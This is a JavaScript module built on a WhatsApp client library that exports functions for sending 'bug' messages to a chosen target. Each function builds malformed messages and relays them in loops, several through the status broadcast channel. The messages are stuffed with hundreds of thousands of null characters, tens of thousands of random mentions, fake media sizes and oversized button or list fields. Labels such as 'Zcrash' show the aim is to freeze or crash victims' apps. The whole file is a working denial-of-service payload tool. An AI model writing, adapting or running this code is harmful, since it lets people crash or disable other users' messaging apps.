const { 
default: baileys, 
proto, 
getContentType, 
generateWAMessage, 
generateWAMessageFromContent, 
generateWAMessageContent,
prepareWAMessageMedia, 
downloadContentFromMessage
} = require("@kagenoureal/baileys");
//====================
let buttons = [];
buttons.push({
"name": "single_select",
"buttonParamsJson": JSON.stringify({
title: "Zconcept?",
sections: [ ]
})
},
{
name: "galaxy_message",
buttonParamsJson: JSON.stringify({
flow_action: "navigate",
flow_action_payload: { screen: "WELCOME_SCREEN" },
flow_cta: "͞ྦྷ".repeat(99999),
flow_id: "BY KAGENOU",
flow_message_version: "9",
flow_token: "?"
})
});
//====================
const THR = {
key: {
remoteJid: "p",
fromMe: false,
participant: "0@s.whatsapp.net",
},
message: {
interactiveResponseMessage: {
body: {
text: "\u0000".repeat(99),
format: "EXTENSIONS_1",
},
nativeFlowResponseMessage: {
name: 'galaxy_message',
paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(165555)}\",\"screen_0_TextInput_1\":\"Gw Mah Ganteng\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
version: 3,
},
},
},
};
//=====================
async function ExecStresszer1(target, conn) {
for (let i = 0; i < 10; i++) {
let msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
"imageMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7118-24/19265573_2084812625327006_1567641022902578597_n.enc?ccb=11-4&oh=01_Q5Aa1QFFNMTbdlYTHzj4CmeS1lmuaBqtraVT7Vqb_QCO0GUS2A&oe=6820F089&_nc_sid=5e03e0&mms3=true",
"mimetype": "image/jpeg",
"fileSha256": "7XYxcPt7NnoSs27tm4QXSwi+lwO1z829ZTDfkOVZXHc=",
"fileLength": "999999999",
"height": 9999,
"width": 9999,
"caption": "✿⏤͟͟͞𝗞𝗮͟͟͞𝗴𝗲𝗻͟͟͞𝗼𝘂? || ☕",
"mediaKey": "wYrelj4x00LDDLTHiTi7uX8VP4O3JdkwCIL7bvTrqA4=",
"fileEncSha256": "t6G9RSFPmjpVmJo3qDRgJo7ugGffaNAlbJECW2GmFyg=",
"directPath": "/v/t62.7118-24/19265573_2084812625327006_1567641022902578597_n.enc?ccb=11-4&oh=01_Q5Aa1QFFNMTbdlYTHzj4CmeS1lmuaBqtraVT7Vqb_QCO0GUS2A&oe=6820F089&_nc_sid=5e03e0",
"mediaKeyTimestamp": "1744403202",
"jpegThumbnail": null,
contextInfo: {
isSampled: true,
mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
length: 30000
}, () => "1" + Math.floor(Math.random() * 450000) + "@s.whatsapp.net")],
participant: target,
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363274419384848@newsletter",
serverMessageId: 1,
newsletterName: "Zstreszer-X",
contentType: 3,
accessibilityText: "Official Newsletter"
}
},
annotations: [{
"embeddedContent": {
"embeddedMusic": {
"musicContentMediaId": "999",
"songId": "777",
"author": "♲︎",
"title": "⏤͟ᏃᏟᎡᎪՏᎻ͟͞͞" + "\u0000".repeat(299999),
"artistAttribution": "https://github.com/kagenouReal",
"countryBlocklist": "S1o=",
"isExplicit": false
}
},
"embeddedAction": true
}]
}
}
}
}, {});
await conn.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: {
jid: target
},
content: undefined
}]}]}]});
console.log("🧊 Success Send Stresszerv1 To Target")
}
}
//=====================
async function ExecStresszer2(target, conn) {
for (let i = 0; i < 10; i++) {
let msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
videoMessage: {
url: "https://mmg.whatsapp.net/v/t62.7161-24/13804612_539276135886426_7177796676655806883_n.enc?ccb=11-4&oh=01_Q5Aa1QEfFbj640Qk2FD0ny7LyZd0M4_73VfKZVcxYuh5xwQzZA&oe=68216AB8&_nc_sid=5e03e0&mms3=true",
mimetype: "video/mp4",
fileSha256: "Q/adIgjaY3KiV8DkDQTo7521m0Zt2SYRbUAYr0WKIzU=",
fileLength: "999999999",
seconds: 9999,
mediaKey: "4nHO5QO3iSFHukSO+Rh9HRw0iadQ4gpggWmPCIAjVs4=",
caption: "愛? || ⏤͟𝗭𝗰𝗿𝗮𝘀𝗵͟͞͞",
height: 9999,
width: 9999,
fileEncSha256: "zeRhIzoqguVqfHibNdNW5ygXfYWEW8xWaFLzwkhIZ6w=",
directPath: "/v/t62.7161-24/13804612_539276135886426_7177796676655806883_n.enc?ccb=11-4&oh=01_Q5Aa1QEfFbj640Qk2FD0ny7LyZd0M4_73VfKZVcxYuh5xwQzZA&oe=68216AB8&_nc_sid=5e03e0",
mediaKeyTimestamp: "1744433512",
jpegThumbnail: null,
contextInfo: {
isSampled: true,
mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
length: 30000
}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")]
},
annotations: [{
embeddedContent: {
embeddedMusic: {
musicContentMediaId: "777",
songId: "777",
author: "Zcrash ||",
title: " Kagenou",
artistAttribution: "https://www.github.com/kagenouReal",
countryBlocklist: true,
isExplicit: true
}
},
embeddedAction: null
}]}}}}, {});
await conn.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: {
jid: target
},
content: undefined
}]}]}]});
console.log("🧊 Success Send Stresszerv2 To Target")
}
}
//=====================
async function ExecAprela(target, conn) {
for (let i = 0; i < 10; i++) {
let msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
interactiveResponseMessage: {
body: {
text: "\u0000💨⏤𝗔͟𝗽𝗿𝗲𝗹𝗮͟͞͞-𝗫\u0000",
format: "EXTENSIONS_1"
},
nativeFlowResponseMessage: {
name: 'galaxy_message',
paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1018000)}\",\"screen_0_TextInput_1\":\"PastiDelay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
version: 3
},
contextInfo: {
participant: "13135550002@s.whatsapp.net",
mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
length: 999
}, () => "1" + Math.floor(Math.random() * 9999) + "@s.whatsapp.net")],
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363274419384848@newsletter",
newsletterName: "Zcrash"
}
}
}
}
}
}, { quoted: null });
await conn.relayMessage("status@broadcast", msg.message, {
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined,
},
],
},
],
},
],
});
}
console.log("🧊 Success Send Aprela To Target")
}
//=====================
async function ExecVialet(target, conn) {
for (let i = 0; i < 10; i++) {
let msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
buttonsResponseMessage: {
selectedButtonId: "\u0000".repeat(5999),
selectedDisplayText: "⌗⏤𝗭͟͟͞𝗰𝗿𝗮͟͟͞𝘀𝗵-𝗫͟͟͞͞",
contextInfo: {
participant: "13135550002@s.whatsapp.net",
mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
length: 32000
}, () => "1" + Math.floor(Math.random() * 520000) + "@s.whatsapp.net")],
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363274419384848@newsletter",
serverMessageId: 1,
newsletterName: "Xstees" + "\u0000".repeat(1999),
contentType: 3,
accessibilityText: "Official Newsletter"
}
},
type: "DISPLAY_TEXT"
}
}
}
}, { quoted: THR });
await conn.relayMessage("status@broadcast", msg.message, {
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined,
},
],
},
],
},
],
});
}
console.log("🧊 Success Send Vialet To Target")
}
//======================

async function ExecAlbumInvis(target, conn) {
const album = await generateWAMessageFromContent(target, {
albumMessage: {
expectedImageCount: 300,
expectedVideoCount: 0
}
}, {});
await conn.relayMessage("status@broadcast", album.message, {
messageId: album.key.id,
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: {
jid: target
},
content: undefined
}]
}]
}]
});
for (let i = 0; i < 300; i++) {
let msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
"imageMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7118-24/12497482_1175919454080990_7026338741363365814_n.enc?ccb=11-4&oh=01_Q5Aa1QEW_O2k7z8t81eLGMNDy_XjqGIrJ8181s_zdXPZPFi_PA&oe=68218DDA&_nc_sid=5e03e0&mms3=true",
"mimetype": "image/jpeg",
"fileSha256": "uLLO/uePn1AhDLn7qKJk8UW/gdAvuSlLU8W4uXE4zIM=",
"fileLength": "999999999",
"height": 9999,
"width": 9999,
"caption": "✿⏤͟͟͞𝗞𝗮͟͟͞𝗴𝗲𝗻͟͟͞𝗼𝘂? || ☕",
"mediaKey": "NvkObEyaWD4Q4zgcVfqPLIMcRC/wsDbhTp36KKdc8M4=",
"fileEncSha256": "NlZnS28tetTO6kH/69EUuQ+LUwv/bLfzub+WxQN6+BY=",
"directPath": "/v/t62.7118-24/12497482_1175919454080990_7026338741363365814_n.enc?ccb=11-4&oh=01_Q5Aa1QEW_O2k7z8t81eLGMNDy_XjqGIrJ8181s_zdXPZPFi_PA&oe=68218DDA&_nc_sid=5e03e0",
"mediaKeyTimestamp": "1744438937",
"jpegThumbnail": null,
contextInfo: {
isSampled: true,
mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
length: 32000
}, () => "1" + Math.floor(Math.random() * 520000) + "@s.whatsapp.net")],
forwardingScore: 999,
isForwarded: true,
},
},
messageContextInfo: {
messageAssociation: {
associationType: 1,
parentMessageKey: album.key
}
}
}
}
}, { upload: conn.waUploadToServer });
await conn.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [{
tag: "meta",
attrs: {},
content: [{
tag: "mentioned_users",
attrs: {},
content: [{
tag: "to",
attrs: {
jid: target
},
content: undefined
}]
}]
}]
});
}
console.log(`🧊 Sent Album message Invis to target.`);
}
//======================
async function ExecListProduct(target, conn) {
let msg = await generateWAMessageFromContent(target, {
listMessage: {
title: "Zconcept?" + "\u0000".repeat(99999),
description: "͟͟🎯𝗭͟͟͞𝗰͟͟͞𝗿͟͟͞𝗮𝘀͟͟͞𝗵͞͞",
buttonText: "",
listType: "PRODUCT_LIST",
productListInfo: {
productSections: Array.from({ length: 999 }, () => ({
title: '\u0000',
products: [{
productId: '9999999'
}]
})),
headerImage: {
productId: "999",
jpegThumbnail: fs.readFileSync('./messages/image/300.jpg')
},
businessOwnerJid: "13135550002@s.whatsapp.net"
},
footerText: "© Kagenou - 2025",
contextInfo: {
isSampled: true,
mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
length: 32000
}, () => "1" + Math.floor(Math.random() * 520000) + "@s.whatsapp.net")],
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363274419384848@newsletter",
newsletterName: "Zstreszer-X"
},
}
}
}, {});
await conn.relayMessage(target, msg.message, { 
messageId: msg.key.id,
participant: { jid: target }
});
}
//======================
async function ExecAlbum(target, conn) {
const album = await generateWAMessageFromContent(target, {
albumMessage: {
expectedImageCount: 30,
expectedVideoCount: 0
}
}, {});
await conn.relayMessage(target, album.message, { messageId: album.key.id,
participant: { jid : target } });
for (let i = 0; i < 30; i++) {
let msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
"imageMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7118-24/12497482_1175919454080990_7026338741363365814_n.enc?ccb=11-4&oh=01_Q5Aa1QEW_O2k7z8t81eLGMNDy_XjqGIrJ8181s_zdXPZPFi_PA&oe=68218DDA&_nc_sid=5e03e0&mms3=true",
"mimetype": "image/jpeg",
"fileSha256": "uLLO/uePn1AhDLn7qKJk8UW/gdAvuSlLU8W4uXE4zIM=",
"fileLength": "999999999",
"height": 9999,
"width": 9999,
"caption": "✿⏤͟͟͞𝗞𝗮͟͟͞𝗴𝗲𝗻͟͟͞𝗼𝘂? || ☕",
"mediaKey": "NvkObEyaWD4Q4zgcVfqPLIMcRC/wsDbhTp36KKdc8M4=",
"fileEncSha256": "NlZnS28tetTO6kH/69EUuQ+LUwv/bLfzub+WxQN6+BY=",
"directPath": "/v/t62.7118-24/12497482_1175919454080990_7026338741363365814_n.enc?ccb=11-4&oh=01_Q5Aa1QEW_O2k7z8t81eLGMNDy_XjqGIrJ8181s_zdXPZPFi_PA&oe=68218DDA&_nc_sid=5e03e0",
"mediaKeyTimestamp": "1744438937",
"jpegThumbnail": null,
contextInfo: {
isSampled: true,
mentionedJid: ["13135550002@s.whatsapp.net", ...Array.from({
length: 32000
}, () => "1" + Math.floor(Math.random() * 520000) + "@s.whatsapp.net")],
forwardingScore: 999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363274419384848@newsletter",
serverMessageId: 1,
newsletterName: "Zstreszer-X"
},
},
},
"messageContextInfo": {
messageAssociation: {
associationType: 1,
parentMessageKey: album.key
}
}
}
}
}, {upload: conn.waUploadToServer});
await conn.relayMessage(target, msg.message, { messageId: msg.key.id,
participant: { jid : target } });
}
console.log("🧊 Success Send Album To Target")
}
//=============================//
//FUNC BUG GROUP
async function overloadButtonGC(target, conn) {
let msg = generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
contextInfo: {
virtexId: conn.generateMessageTag(),
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: ["13135550002@s.whatsapp.net"],
isForwarded: true,
forwardingScore: 999
},
body: {
text: ""
},
footer: null,
header: {
hasMediaAttachment: false
},
nativeFlowMessage: {
 buttons: buttons
}
}
}
}
}, {quoted: null });
await conn.relayMessage(target, msg.message, {
messageId: msg.key.id
});
}
//===========================//
module.exports = {
overloadButtonGC, 
ExecStresszer1, 
ExecStresszer2, 
ExecAprela, 
ExecVialet, 
ExecAlbumInvis,
ExecAlbum
};